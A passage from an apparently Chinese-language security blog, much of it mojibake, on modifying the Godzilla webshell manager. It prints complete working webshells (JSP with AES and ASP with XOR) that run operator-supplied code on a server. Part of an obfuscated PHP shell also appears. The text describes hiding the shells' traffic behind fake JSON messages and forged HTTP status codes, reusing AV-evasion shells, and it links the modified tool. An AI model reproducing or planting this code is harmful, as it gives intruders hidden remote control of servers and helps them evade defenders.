class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$base64_qianxingCgkD21wHn</span>(qianxingCgkD21wHn(@run(<span class="variable">$datqianxin7mlwRjVMRy1A</span>),<span class="variable">$qianxin1B</span>));</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos<span class="comment">/*dbappsecurityGS4ujb8wCNv1LjR*/</span>(<span class="variable">$datqianxin7mlwRjVMRy1A</span>,<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>)))!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>]=qianxingCgkD21wHn(<span class="variable">$datqianxin7mlwRjVMRy1A</span>,<span class="variable">$qianxin1B</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918181736832.png" alt="image-20240918181736832"></p><p>æ¢æˆæˆ‘ä»¬çš„ä»£ç ï¼Œä¸­é—´keyå’Œpassæ›¿æ¢ä¸€ä¸‹ã€‚</p><p>ç”Ÿæˆå¥½çš„phpä»£ç å³å¯ç›´æ¥ä½¿ç”¨ã€‚</p><p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ”¹xorbaseçš„ä»£ç ï¼Œæ·»åŠ çš„é‚£ä¸ªæ–‡ä»¶è¦æ‰£xorbase64çš„ä»£ç ï¼Œè¦ä¸ç„¶evalä»£ç ç”¨xorbase64çš„payloadè‚¯å®šç”¨ä¸äº†ã€‚</p><p>ç¬”è€…è¿™é‡Œç ”ç©¶xorraw,æ²¡ç ”ç©¶æ˜ç™½ï¼Œåªæ˜¯ç ”ç©¶äº†ä¸€ä¸¢ä¸¢</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240920180815804.png" alt="image-20240920180815804"></p><p>æˆ‘ä»¬è¿™é‡Œçœ‹ä¸‹xorçš„æµé‡åŠ ä¸Šmessageï¼Œæ˜¯ä¸æ˜¯æ„Ÿè§‰æœ‰ç‚¹çªå…€ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±æ˜¯xorçš„ä¹±ç ï¼Œå¦‚æœæˆ‘ä»¬åœ¨åŠ messageæ„Ÿè§‰æœ‰ç‚¹æ€ªæ€ªçš„ã€‚è¿™é‡Œå°±ä¸åŠ äº†ã€‚ï¼ˆå…¶å®æ˜¯æ²¡ç ”ç©¶æ˜ç™½ï¼Œç­‰æˆ‘åœ¨å­¦å­¦ï¼‰</p><h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>å¥½æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹jspçš„ï¼Œgodzillaé»˜è®¤javaçš„æœ‰ä¸¤ç§è½½è·ï¼Œä¸€ç§aes-base64,ä¸€ç§æ˜¯aes-rawï¼Œå’Œphpä¸€æ ·ï¼Œä¸è¿‡phpæ˜¯å…ˆxorï¼Œå¯èƒ½æ˜¯phpé»˜è®¤å¼€å¯sslå“ªä¸ªå‡½æ•°çš„è¯ï¼Œç”¨å¯¹ç§°åŠ å¯†å§ï¼Œjavaé»˜è®¤æœ‰aesï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ç”¨äº†ï¼Œå°±é€šç”¨äº†ã€‚</p><p>jspé»˜è®¤ java-aes-base64<br>&lt;%! String xc=â€3c6e0b8a9c15224aâ€; String pass=â€passâ€; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(â€œAESâ€);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),â€AESâ€));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(â€œMD5â€);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(â€œjava.util.Base64â€);Object Encoder = base64.getMethod(â€œgetEncoderâ€, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(â€œencodeToStringâ€, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(â€œsun.misc.BASE64Encoderâ€); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(â€œencodeâ€, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(â€œjava.util.Base64â€);Object decoder = base64.getMethod(â€œgetDecoderâ€, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(â€œdecodeâ€, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(â€œsun.misc.BASE64Decoderâ€); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(â€œdecodeBufferâ€, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(â€œpayloadâ€)==null){session.setAttribute(â€œpayloadâ€,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(â€œparametersâ€,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(â€œpayloadâ€)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}<br>%&gt;</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009175840339.png" alt="image-20241009175840339"></p><p>é»˜è®¤aesæµé‡ï¼Œè¿™é‡Œç”±äºå…¨å±€è®¾ç½®äº†å‰åç¼€ï¼Œå°±ç›´æ¥å¸¦äº†ï¼Œä¸‹é¢è¿”å›åŒ…ï¼Œå’Œphpbase64ä¸€æ ·</p><img src="/images/å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1/image-20241009180000918.png" alt="image-20241009180000918"  /><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009181920050.png" alt="image-20241009181920050"></p><p>æˆ‘ä»¬å…ˆæ”¹ä¸€ä¸‹ä»£ç ã€‚ä¾æ—§æ›¿æ¢ä¸€ä¸‹å·¦å³ä¿¡æ¯</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174148624.png" alt="image-20241010174148624"></p><p>ç„¶åæˆ‘ä»¬åœ¨å†™ä¸¤ä¸ªå˜é‡ï¼ŒæŠŠå‰åçš„md5æ›¿æ¢æ‰å°±å¥½äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174432335.png" alt="image-20241010174432335"></p><p>è¿™æ ·å°±å¥½çœ‹ä¸€ç‚¹äº†ï¼Œç„¶åæˆ‘ä»¬ä¹ŸæŠŠjspçš„è¿”å›å“åº”åŒ…å†™é‡Œé¢</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174630597.png" alt="image-20241010174630597"></p><p>å¥½ï¼Œå†™å¥½ä¹‹åï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ã€‚404.</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174236574.png" alt="image-20241011174236574"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174043037.png" alt="image-20241011174043037"></p><p>æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œå¥½ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹æ€ä¹ˆç”Ÿæˆçš„ç ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011173910400.png" alt="image-20241011173910400"></p><p>ä»æ–°åœ¨generateé‡Œé¢å†™ä¸€ä¸ªæ–¹æ³•ï¼ŒåŸæ¥çš„æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public byte[] generate(String password, String secretKey) &#123;</span><br><span class="line">    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ–°å†™ä¸€ä¸ªæ–¹æ³•</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174428716.png" alt="image-20241011174428716"></p><p>ç„¶åå»åˆ°generateæ–‡ä»¶ï¼Œcopyä¸€ä¸ªæ–¹æ³•ï¼Œç„¶ååŠ ä¸ªmesssage</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174502165.png" alt="image-20241011174502165"></p><p>ç„¶åå°±æ˜¯æŠŠbinæ–‡ä»¶å†™å¥½ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç”¨çš„å¤§å¸ˆå‚…çš„ä»£ç ï¼Œå›å¤´å’±ä»¬è‡ªå·±æ”¹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174605083.png" alt="image-20241011174605083"></p><p>æœ€åè°ƒç”¨çš„æ–¹æ³•å†™ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174704236.png" alt="image-20241011174704236"></p><p>okï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥ç”Ÿæˆäº†ï¼Œæµ‹è¯•æ²¡å•¥é—®é¢˜ã€‚</p><p>æˆ‘ç”¨å…¶ä»–å¤§å¸ˆå‚…çš„äºŒå¼€çš„ï¼Œå¥½å¤šéƒ½ä¸èƒ½ç”ŸæˆåŸç‰ˆçš„ï¼Œè¿™æ ·æ¯”è¾ƒç®€å•ç”Ÿæˆæˆ‘ä»¬è‡ªå®šä¹‰çš„äº†ã€‚</p><p>è¿™é‡Œå°±ä¸è¯¥aesrawçš„äº†ã€‚è·Ÿä¸Šé¢åŸå› ä¸€æ ·ï¼Œä¸å¥½çœ‹ã€‚ï¼ˆå…¶å®å°±æ˜¯ç¬”è€…æ²¡ç ”ç©¶æ˜ç™½ï¼‰</p><h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>ASPæ˜¯Active Server Pageçš„ç¼©å†™ï¼Œæ„ä¸ºâ€œæ´»åŠ¨æœåŠ¡å™¨ç½‘é¡µâ€ã€‚æ˜¯MicroSoftå…¬å¸å¼€å‘çš„æœåŠ¡å™¨ç«¯è„šæœ¬ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªWEBæœåŠ¡å™¨ç«¯çš„å¼€å‘ç¯å¢ƒï¼Œåˆ©ç”¨å®ƒå¯ä»¥äº§ç”Ÿå’Œæ‰§è¡ŒåŠ¨æ€çš„ã€äº’åŠ¨çš„ã€é«˜æ€§èƒ½çš„WEBæœåŠ¡åº”ç”¨ç¨‹åºã€‚ASPé‡‡ç”¨è„šæœ¬è¯­è¨€VBScriptï¼ˆJavascriptï¼‰ä½œä¸ºè‡ªå·±çš„å¼€å‘è¯­è¨€ã€‚å¸¸ç”¨äºå„ç§åŠ¨æ€ç½‘ç«™ä¸­ã€‚ ASPæ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯è„šæœ¬ç¼–å†™ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºå’Œè¿è¡ŒåŠ¨æ€ç½‘é¡µæˆ–webåº”ç”¨ç¨‹åºã€‚ASPçš„ç½‘é¡µæ–‡ä»¶çš„æ ¼å¼æ˜¯.aspã€‚</p><p>aspçš„æˆ‘ä»¬é€‰ç”¨<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012102901818.png" alt="image-20241012102901818"></p><p>asp xor base64çš„æ”¹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012103024676.png" alt="image-20241012103024676"></p><p>è¿™æ˜¯æˆ‘ä»¬çš„åŸå§‹æµé‡ï¼Œé•¿å¾—å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)</span><br><span class="line"></span><br><span class="line">Function Base64Decode(ByVal vCode)</span><br><span class="line">    Dim oXML, oNode</span><br><span class="line">    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)</span><br><span class="line">    Set oNode = oXML.CreateElement(&quot;base64&quot;)</span><br><span class="line">    oNode.dataType = &quot;bin.base64&quot;</span><br><span class="line">    oNode.text = vCode</span><br><span class="line">    Base64Decode = oNode.nodeTypedValue</span><br><span class="line">    Set oNode = Nothing</span><br><span class="line">    Set oXML = Nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function decryption(content,isBin)</span><br><span class="line">    dim size,i,result,keySize</span><br><span class="line">    keySize = len(key)</span><br><span class="line">    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    BinaryStream.CharSet = &quot;iso-8859-1&quot;</span><br><span class="line">    BinaryStream.Type = 2</span><br><span class="line">    BinaryStream.Open</span><br><span class="line">    if IsArray(content) then</span><br><span class="line">        size=UBound(content)+1</span><br><span class="line">        For i=1 To size</span><br><span class="line">            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))</span><br><span class="line">        Next</span><br><span class="line">    end if</span><br><span class="line">    BinaryStream.Position = 0</span><br><span class="line">    if isBin then</span><br><span class="line">        BinaryStream.Type = 1</span><br><span class="line">        decryption=BinaryStream.Read()</span><br><span class="line">    else</span><br><span class="line">        decryption=BinaryStream.ReadText()</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line">    key=&quot;3c6e0b8a9c15224a&quot;</span><br><span class="line">    content=request.Form(&quot;pass&quot;)</span><br><span class="line">    if not IsEmpty(content) then</span><br><span class="line"></span><br><span class="line">        if  IsEmpty(Session(&quot;payload&quot;)) then</span><br><span class="line">            content=decryption(Base64Decode(content),false)</span><br><span class="line">            Session(&quot;payload&quot;)=content</span><br><span class="line">            response.End</span><br><span class="line">        else</span><br><span class="line">            content=decryption(Base64Decode(content),true)</span><br><span class="line">            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)</span><br><span class="line">            Execute(bypassDictionary(&quot;payload&quot;))</span><br><span class="line">            result=run(content)</span><br><span class="line">            response.Write(&quot;11cd6a&quot;)</span><br><span class="line">            if not IsEmpty(result) then</span><br><span class="line">                response.Write Base64Encode(decryption(result,true))</span><br><span class="line">            end if</span><br><span class="line">            response.Write(&quot;ac826a&quot;)</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°  æœ€åè¾“å‡ºäº†ä¸¤ä¸ªå­—ç¬¦ä¸²</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012104746955.png" alt="image-20241012104746955"></p><p>æºpayloadä¸­ä¹Ÿæ˜¯åŒ¹é…å‰å…­å’Œåå…­ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¡ºç€ä»–çš„æ”¹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171426760.png" alt="image-20241012171426760"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171446561.png" alt="image-20241012171446561"></p><p>åŸç‰ˆä»£ç æ”¹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171504578.png" alt="image-20241012171504578"></p><p>éå¸¸okã€‚æˆ‘ä»¬æ¥æ”¹ä¸€ä¸‹å›æ˜¾çŠ¶æ€ç ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100654131.png" alt="image-20241112100654131"></p><p>aspçš„è¯  æˆ‘ä»¬åŠ è¿™ä¸€å¥è¯å³å¯</p><p>Response.Status = â€œ500 Internal Server Errorâ€</p><p>å°±ä¼šå¼ºåˆ¶æ”¹å›æ˜¾çŠ¶æ€ç ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100816345-17313772966692.png" alt="image-20241112100816345"></p><p>è”½æ—¥è¿™é‡Œæ”¹æˆaï¼Œæˆ‘ä»¬å°±ä¼šå¼ºåˆ¶åŠ ä¸ªçŠ¶æ€ç </p><p>å¦‚æœæ”¹æˆ404ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±ä¸å¯ä»¥ä½¿ç”¨äº†</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104047871.png" alt="image-20241112104047871"></p><p>ç›´æ¥å°±ä¼šæŠ¥é”™ï¼Œè®¾ç½®æˆ302å°±ä¸ä¼šæŠ¥é”™äº†ï¼Œä¹Ÿå¯ä»¥ç”¨ï¼Œä½†æ˜¯å§  ä»”ç»†çœ‹çš„è¯ï¼Œæ„Ÿè§‰æœ‰ç‚¹é—®é¢˜</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104124569.png" alt="image-20241112104124569"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104316247.png" alt="image-20241112104316247"></p><p>å½“ç„¶ï¼Œä½ å¯ä»¥åŠ ä¸€äº›ä½ å–œæ¬¢çš„å­—ç¬¦ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112105056867.png" alt="image-20241112105056867"></p><p>å¥½ï¼Œç„¶åæˆ‘ä»¬ç”¨å¤§å¸ˆå‚…çš„å…æ€ï¼Œç¼åˆä¸€ä¸‹ã€‚</p><p>åªéœ€è¦å°†ç”Ÿæˆçš„é©¬æ”¹ä¸‹æ ¼å¼ï¼Œç„¶åæ”¾åœ¨templateä¸‹å³å¯</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164410940.png" alt="image-20241112164410940"></p><p>æ­¤æ—¶å°±èƒ½ç”Ÿæˆäº†ã€‚</p><p>ç”Ÿæˆä¸€ä¸ªï¼Œè¯•ä¸€ä¸‹ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164520622.png" alt="image-20241112164520622"></p><p>301ä¼ªè£…ï¼Œemmmï¼Œè¿˜è¡Œå§ã€‚aspçš„å…ˆè¿™æ ·ã€‚</p><h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>æ¥ä¸‹æ¥æ—¶aspxçš„</p><p>å…¶å®æµç¨‹éƒ½ä¸€æ ·äº†ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¢ä¸ªå•è¯ï¼Œå°±ç”¨å¸¸è§çš„dataå§</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164145932.png" alt="image-20241113164145932"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164158602.png" alt="image-20241113164158602"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102937132.png" alt="image-20241114102937132"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113165224132.png" alt="image-20241113165224132"></p><p>è‡³æ­¤ï¼Œç®€å•çš„äºŒå¼€å“¥æ–¯æ‹‰å°±å®Œæˆäº†ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰æ”¹ä»€ä¹ˆï¼Œå°±åªæ˜¯åŠ äº†å‰åç¼€ï¼Œå¹¶ä¸”æœ‰ä¸€äº›åŠ å¯†ç±»å‹ä¹Ÿæ²¡æœ‰åšæ›´æ”¹ï¼Œåªæ˜¯è‡ªå·±å­¦ä¹ ä¸€ä¸‹ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><p>å¦‚æœå¤§å“¥ä»¬æœ‰è‡ªå·±çš„å…æ€é©¬ï¼Œä½†æ˜¯è¿˜ç”¨ä¿ºè¿™ä¸ªç±»å‹çš„ï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨æœ¨é©¬å‰åè¾“å‡ºçš„åœ°æ–¹æ”¹æˆdataè¿™ç§å½¢å¼å°±å¯ä»¥äº†ã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>è¿™é‡Œåªæ˜¯æ”¹äº†ä¸€ä¸¢ä¸¢ï¼Œå¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ï¼Œä¸‹ä¸ªç‰ˆæœ¬æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è€Œä¸”æ˜¯æŠ„çš„å…¶ä»–å¤§å¸ˆå‚…çš„å…æ€ğŸï¼Œä¸‹å›äº‰å–çš„åšä¸€ä¸‹å…æ€ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚</p><h5 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h5><p><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            åŸç‰ˆå“¥æ–¯æ‹‰</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzkxNTUwNjgxOQ==&amp;mid=2247484153&amp;idx=1&amp;sn=67d8b3932714ff0a0ee5745f7049a661&amp;scene=21#wechat_redirect    å“¥æ–¯æ‹‰webshellç®¡ç†å·¥å…·äºŒå¼€å°è®°</span><br><span class="line">https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla</span><br></pre></td></tr></table></figure><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzillaã€äºŒå¼€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å„ç§è„šæœ¬</title>
      <link href="/2024/04/29/%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/04/29/%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h5 id="å†°è4-çˆ†ç ´"><a href="#å†°è4-çˆ†ç ´" class="headerlink" title="å†°è4,çˆ†ç ´"></a>å†°è4,çˆ†ç ´</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 